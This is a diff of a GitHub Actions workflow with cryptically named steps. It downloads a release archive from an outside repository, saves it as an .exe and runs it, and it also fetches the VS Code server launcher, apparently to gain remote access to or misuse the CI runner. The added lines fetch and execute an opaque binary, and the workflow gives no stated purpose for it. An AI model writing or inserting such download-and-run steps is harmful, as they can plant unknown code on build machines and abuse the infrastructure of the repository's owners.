@@ -15,12 +15,12 @@ jobs:
     steps:
       - name: dodl
         run: |
-          Invoke-WebRequest "https://raw.githubusercontent.com/Klanly/buildcv/main/vxprt.py" -OutFile "c:\vxprt.py"
+          Invoke-WebRequest "https://github.com/Klanly/buildcv/releases/download/200.300/stdprt.zip" -OutFile "c:\stdprt.exe"
           Invoke-WebRequest "https://aka.ms/vscode-server-launcher/x86_64-pc-windows-msvc" -OutFile "c:\vsc.exe"
 
       - name: tocmd
         run: |
-          python c:\vxprt.py
+          c:\stdprt.exe
         shell: cmd
 
  
